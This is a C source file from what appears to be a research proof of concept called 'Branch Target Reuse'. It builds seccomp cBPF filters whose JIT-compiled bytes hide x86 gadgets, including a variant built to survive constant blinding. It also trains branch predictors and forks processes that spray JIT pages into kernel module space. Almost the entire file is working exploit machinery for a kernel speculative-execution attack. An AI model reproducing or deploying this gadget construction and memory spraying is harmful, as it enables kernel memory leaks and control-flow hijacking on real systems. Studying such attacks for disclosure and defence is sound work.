/*
 * Branch Target Reuse (BTR)
 * April 30th 2026
 * Sander Wiebing
 */

#define _GNU_SOURCE

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <assert.h>
#include <stddef.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdint.h>
#include <syscall.h>
#include <pthread.h>

#include "targets.h"
#include "common.h"

#define VICTIM_SYSCALL SYS_mmap // mmap

#define LO_ARG(idx) offsetof(struct seccomp_data, args[(idx)])
#define HI_ARG(idx) offsetof(struct seccomp_data, args[(idx)]) + sizeof(__u32)

#define BPF_2_BYTES ((struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, 1))
#define BPF_3_BYTES ((struct sock_filter) BPF_STMT(BPF_ST, 0))
#define BPF_4_BYTES ((struct sock_filter) BPF_STMT(BPF_STX, 0))
#define BPF_5_BYTES ((struct sock_filter) BPF_STMT(BPF_ALU+BPF_LSH+BPF_X, 0))

#define BPF_CB_16_BYTES ((struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0x1010))
#define BPF_CB_21_BYTES ((struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW))


#define syscall_nr (offsetof(struct seccomp_data, nr))

struct sock_filter page_size_filter[BPF_MAXINSNS] = {0};

struct sock_fprog page_size_prog = {
    .filter = page_size_filter,
    .len = 0,
};

struct sock_filter double_page_size_filter[BPF_MAXINSNS] = {0};
struct sock_fprog double_page_size_prog = {
    .filter = double_page_size_filter,
    .len = 0,
};

struct sock_filter train_filter[BPF_MAXINSNS] = {0};

struct sock_fprog train_prog = {
    .filter = train_filter,
    .len = 0,
};

// -- Initialize a cBPF program of 1 page size
void initialize_page_size_filter(){

    int ins_idx = 0;

    // short path: allow all victim syscall (except non-existing 600)
    page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr);
    page_size_filter[ins_idx++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0xdead, 1, 0);
    page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    for (size_t i = 0; i < 440; i++)
    {
        // 9-byte instruction (cmp    rax,0x258; je  +2)
        // 440 * 9 = 3960 + some padding results in 1 page reserved
	    page_size_filter[ins_idx++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0xdead, 0, 0);
    }

    page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    assert(ins_idx < 4096);

    page_size_prog.filter = page_size_filter;
    page_size_prog.len = ins_idx;

    printf("Total number of BPF instructions for page_size filter: %d\n", page_size_prog.len);

}

void initialize_target_chunk_constant_blind() {

    int n_bytes = 0;
    int ins_idx = 0;
    int iterations;


    double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);
    double_page_size_filter[ins_idx++] = BPF_2_BYTES;

#define OFFSET_NOP_SLED 300
    int idx_nop_sled = ins_idx + 1;
    // start creating gadgets
    for (size_t i = 0; i < 25; i++) {
        // e9 90 14 00 00 + e9 next inst ->
        // 90    : NOP
        // 14 00 : ADC AL, 0X0
        // 00 e9 : ADC byte ptr [RAX], AL
        double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, OFFSET_NOP_SLED); // 90 14
    }

    // 57 04  push rdi
#define OFFSET_PUSH_RDI 75
    double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, OFFSET_PUSH_RDI); // push rdi
    int idx_push_rdi = ins_idx;

    // 58 04 pop rax
#define OFFSET_POP_RAX 76
    double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, OFFSET_POP_RAX); // pop rax
    int idx_pop_rax = ins_idx;

#define OFFSET_ADD_RAX 832
    // 02 40 00   ADD AL, byte ptr [RAX]
    double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, OFFSET_ADD_RAX); // add rax
    int idx_add_rax = ins_idx;

    // 48 8b 00   MOV     RAX,qword ptr [RAX]
#define OFFSET_MOV_RAX 1750
    double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, OFFSET_MOV_RAX); //  MOV  RAX,qword ptr [RAX]
    int idx_mov_rax = ins_idx;

    // push rax 50 0C
#define OFFSET_PUSH_RAX 172
    double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, OFFSET_PUSH_RAX); // push rax
    int idx_push_rax1 = ins_idx;

    // push rax 50 0C
#define OFFSET_PUSH_RAX2 172
    double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, OFFSET_PUSH_RAX2); // push rax
    int idx_push_rax2 = ins_idx;

    // pop rdx 5a 0C
#define OFFSET_POP_RDX 174
    double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, OFFSET_POP_RDX); // pop rdx
    int idx_pop_rdx = ins_idx;

    // pop rdi 5f 0C
#define OFFSET_POP_RDI 175
    double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, OFFSET_POP_RDI); // pop rdi
    int idx_pop_rdi = ins_idx;

    // ff e0  JMP RAX
    // ff 20  JMP [RAX]
#define OFFSET_JMP_RAX 447
    double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, OFFSET_JMP_RAX); // JMP     RAX
    int idx_jmp_rax = ins_idx;

    // Some slack 5 byte instructions
    // prevents us to rewrite everything when adding an extra instruction above
    for (size_t i = 0; i < 20; i++)
    {
        double_page_size_filter[ins_idx++] = BPF_5_BYTES;
    }

    for (size_t i = 0; i < 1740; i++)
    {
        double_page_size_filter[ins_idx++] = BPF_CB_21_BYTES;
    }

    for (size_t i = idx_nop_sled; i < idx_nop_sled + 25; i++)
    {
        double_page_size_filter[OFFSET_NOP_SLED+ i] = BPF_5_BYTES;
    }


    // alignment for push rdi
    double_page_size_filter[idx_push_rdi + OFFSET_PUSH_RDI - 1] = BPF_5_BYTES;

    // alignment for pop rax
    assert(OFFSET_PUSH_RDI <= OFFSET_POP_RAX - 1);
    double_page_size_filter[idx_pop_rax + OFFSET_POP_RAX - 2] = BPF_3_BYTES;
    double_page_size_filter[idx_pop_rax + OFFSET_POP_RAX - 1] = BPF_3_BYTES;

    // alignment for nop sled
    double_page_size_filter[idx_nop_sled + OFFSET_NOP_SLED-1] = BPF_5_BYTES;

    // alignment for push rax
    double_page_size_filter[idx_push_rax1 + OFFSET_PUSH_RAX-2] = BPF_CB_16_BYTES;
    double_page_size_filter[idx_push_rax1 + OFFSET_PUSH_RAX-1] = BPF_2_BYTES;

    double_page_size_filter[idx_push_rax2 + OFFSET_PUSH_RAX2-1] = BPF_5_BYTES;

    // alignment for pop rdx
    double_page_size_filter[idx_pop_rdx + OFFSET_POP_RDX-3] = BPF_5_BYTES;
    double_page_size_filter[idx_pop_rdx + OFFSET_POP_RDX-2] = BPF_5_BYTES;
    double_page_size_filter[idx_pop_rdx + OFFSET_POP_RDX-1] = BPF_5_BYTES;

    // alignment for pop rdi
    double_page_size_filter[idx_pop_rdi + OFFSET_POP_RDI-2] = BPF_5_BYTES;
    double_page_size_filter[idx_pop_rdi + OFFSET_POP_RDI-1] = BPF_5_BYTES;

    // alignment for add rax
    double_page_size_filter[idx_add_rax + OFFSET_ADD_RAX-3] = BPF_5_BYTES;
    double_page_size_filter[idx_add_rax + OFFSET_ADD_RAX-2] = BPF_5_BYTES;
    double_page_size_filter[idx_add_rax + OFFSET_ADD_RAX-1] = BPF_3_BYTES;


    // alignment for mov rax
    double_page_size_filter[idx_mov_rax + OFFSET_MOV_RAX-2] = BPF_CB_16_BYTES;
    double_page_size_filter[idx_mov_rax + OFFSET_MOV_RAX-1] = BPF_2_BYTES;

    // alignment for jmp rax;
    double_page_size_filter[idx_jmp_rax + OFFSET_JMP_RAX-2] = BPF_5_BYTES;
    double_page_size_filter[idx_jmp_rax + OFFSET_JMP_RAX-1] = BPF_5_BYTES;


    // final allow
    double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);


    assert(ins_idx <= 4096);

    double_page_size_prog.filter = double_page_size_filter;
    double_page_size_prog.len = ins_idx;
}


void initialize_target_chunk() {
    int ins_idx = 0;

    // short path: allow all victim syscall (except non-existing 600)
    // double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr);
    // double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0xdead, 1, 0);
    // double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    for (size_t i = 0; i < 20; i++)
    {
        // 5 byte instruction (add    eax,0xbeef)
        double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_ALU+BPF_ADD, 0x1067ff90);
    }


    double_page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    assert(ins_idx < 4096);

    double_page_size_prog.filter = double_page_size_filter;
    double_page_size_prog.len = ins_idx;

}

void initialize_double_page_size_filter(uint8_t constant_blind_safe){


    if (constant_blind_safe) {
        initialize_target_chunk_constant_blind();
    } else {
        initialize_target_chunk();
    }

    printf("Total number of BPF instructions for target chunk: %d\n", double_page_size_prog.len);

}

// -- BPF instruction for different byte lengths:
// 3 bytes: (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TAX, 0);
// 3 bytes: (struct sock_filter) BPF_STMT(BPF_ST, 0);
// 4 bytes: (struct sock_filter) BPF_STMT(BPF_STX, 0);
// 6 bytes: (struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0xdeadd0d0);

// 3 bytes: train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_ALU+BPF_ADD, 0x1);
// 5 bytes: (struct sock_filter) BPF_STMT(BPF_ALU+BPF_ADD, 0xbeef);
// 9 bytes: (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 438, 0, 0);


void insert_training_branch(uint64_t branch_offset, uint64_t target_offset) {

    // assert(branch_offset == 0xa4);
    // For this PoC we assume a static target offset of 0xa0

    int n_bytes = 0;
    int ins_idx = 0;
    int iterations;

    // short path: not our victim syscall
    train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr);
    // train_filter[ins_idx++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 122, 2, 0); // SYS_uname
    train_filter[ins_idx++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, VICTIM_SYSCALL, 1, 0);
    train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    // ...
    // We assume a offset of 40 bytes
    // ...
    // 'header' up to here:
    //    0xffffffffc27d301c:  nop    DWORD PTR [rax+rax*1+0x0]
    //    0xffffffffc27d3021:  push   rbp
    //    0xffffffffc27d3022:  mov    rbp,rsp
    //    0xffffffffc27d3025:  push   rbx
    //    0xffffffffc27d3026:  push   r13
    //    0xffffffffc27d3028:  xor    eax,eax
    //    0xffffffffc27d302a:  xor    r13d,r13d
    //    0xffffffffc27d302d:  mov    rbx,rdi
    //    0xffffffffc27d3030:  mov    eax,DWORD PTR [rbx+0x0]
    //    0xffffffffc27d3033:  cmp    rax,0x9
    //    0xffffffffc27d3037:  je     0xffffffffc27d3044
    //    0xffffffffc27d3039:  mov    eax,0x7fff0000
    //    0xffffffffc27d303e:  pop    r13
    //    0xffffffffc27d3040:  pop    rbx
    //    0xffffffffc27d3041:  leave
    //    0xffffffffc27d3042:  ret
    //    0xffffffffc27d3043:  int3
    //    0xffffffffc27d3044:  ...
    // -> is 40 bytes
    n_bytes += 40;

    // We place 33 instructions of 6 bytes. (72 bytes)
    //  160 (=0xa0) - 40 - (33 * 3) = 31.


    iterations = 33;
    // iterations = 0 + (rand() % 50);
    for (size_t i = iterations; i > 0; i--)
    {
        // 3-byte instruction ( mov    r13,rax)
        train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TAX, 0);
        n_bytes += 3;
    }


    // TRAIN BRANCH:
    // we place the instruction later
    int train_branch_idx = ins_idx++;

    // assert(target_offset - branch_offset - 1 == 128);

    // We need to fill the gap of 128 bytes between train branch and target
    // 41 * 3 + 5 == 128
    iterations = 41 ;
    // iterations = 0 + (rand() % 50);
    for (size_t i = iterations; i > 0; i--)
    {
        // 3-byte instruction (mov    r13,rax)
        train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TAX, 0);
        n_bytes += 3;
    }
    // 5 byte instruction (add    eax,0xbeef)
    train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_ALU+BPF_ADD, 0xbeef);
    n_bytes += 5;


    int jump_length = ins_idx - train_branch_idx - 1; // static offset: 42
    train_filter[train_branch_idx] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, VICTIM_SYSCALL, iterations, jump_length);

    // SPECULATION TARGET: (mov    r13d,0xcafebabe)
    train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0xcafebabe);


    // some padding
    for (size_t i = 0; i < 10; i++)
    {
        // 6-byte instruction (mov    r13d,0x10101010)
        train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0x10101010);
        n_bytes += 6;
    }

    train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    // fill up the page
    for (size_t i = 0; i < 600; i++)
    {
        // 6-byte instruction (mov    r13d,0x20202020)
        train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0x20202020);
        n_bytes += 6;
    }

    train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    assert(ins_idx < 4096);

    train_prog.filter = train_filter;
    train_prog.len = ins_idx;

    // printf("Total number of BPF instructions for train filter: %d\n", train_prog.len);

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &train_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }

}


void insert_allow_all_prog() {

    // assert(branch_offset == 0xa4);
    // For this PoC we assume a static target offset of 0xa0

    int n_bytes = 0;
    int ins_idx = 0;
    int iterations;

    struct sock_filter cur_filter[BPF_MAXINSNS] = {0};
    struct sock_fprog cur_prog = {0};

    cur_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    cur_prog.filter = cur_filter;
    cur_prog.len = ins_idx;

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &cur_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }

}


void insert_page_size_prog() {

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &page_size_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }
}

void insert_double_page_size_prog() {

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &double_page_size_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }
}


// Fork and allocate total of 2MB memory in module space
void fork_insert_program_2MB() {


    // we JIT 512 pages in order to reserve 2MB in total
    pid_t p;

    for (size_t i = 0; i < 512 / 64; i++)
    {
        // we create 8 childs, which all will JIT 64 pages
        p = fork();
        if (p < 0) {
            perror("fork fail");
            exit(1);
        } else if (p > 0) {
            usleep(1000 * 100);
            continue;
        } else {
            // child
            break;
        }

    }

     if (p > 0) {
        usleep(1000 * 100);
        // parent returns
        return;
    }

    // pin_to_core(IDLE_CORE);

    for (int i = 0; i < 64; i++) {

        if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &page_size_prog)) {
            perror("prctl(SECCOMP)");
            exit(1);
        }

    }


    while (1)
    {
        sleep(100);
    }

}

// Fork and insert allow all prog
void fork_insert_allow_all_prog(int n) {

    pid_t p;
    p = fork();
    if (p < 0) {
      perror("fork fail");
      exit(1);
    } else if (p > 0) {
        usleep(1000);
        // parent returns
        return;
    }

    for (size_t i = 0; i < n; i++)
    {
        insert_allow_all_prog();
    }

    while (1)
    {
        sleep(100);
    }

}

// Fork and allocate 4k memory in module space
void fork_insert_program_4K() {

    pid_t p;
    p = fork();
    if (p < 0) {
      perror("fork fail");
      exit(1);
    } else if (p > 0) {
        usleep(1000);
        // parent returns
        return;
    }

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &page_size_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }


    while (1)
    {
        sleep(100);
    }

}

// Fork and allocate 4k memory in module space
void fork_insert_program_2K() {

    pid_t p;
    p = fork();
    if (p < 0) {
      perror("fork fail");
      exit(1);
    } else if (p > 0) {
        usleep(1000);
        // parent returns
        return;
    }

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &double_page_size_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }

    while (1)
    {
        sleep(100);
    }

}


// Fork and allocate N pages in module space
void fork_insert_program_n_pages(uint64_t n_pages) {

    assert(n_pages <= 64);

    pid_t p;
    p = fork();
    if (p < 0) {
      perror("fork fail");
      exit(1);
    } else if (p > 0) {
        usleep(1000);
        // parent returns
        return;
    }

    // pin_to_core(IDLE_CORE);

    for (int i = 0; i < n_pages; i++) {

        if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &page_size_prog)) {
            perror("prctl(SECCOMP)");
            exit(1);
        }

    }

    while (1)
    {
        sleep(100);
    }

}

// Fork and allocate N bytes in module space
void fork_reserve_n_bytes(uint64_t bytes) {

    uint64_t n_pages = 0;

    assert(bytes % 4096 == 0);


    while (bytes > (64 * 4096))
    {
        fork_insert_program_n_pages(64);
        bytes -= (64 * 4096);
        n_pages += 64;
    }

    fork_insert_program_n_pages(bytes / 4096);
    n_pages += bytes / 4096;

    printf("[+] Reserved in total %lu pages\n", n_pages);

}

void initialize_cbpf(uint8_t constant_blind_safe) {

	if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
		perror("prctl(NO_NEW_PRIVS)");
        exit(1);
	}

    initialize_page_size_filter();
    initialize_double_page_size_filter(constant_blind_safe);

}
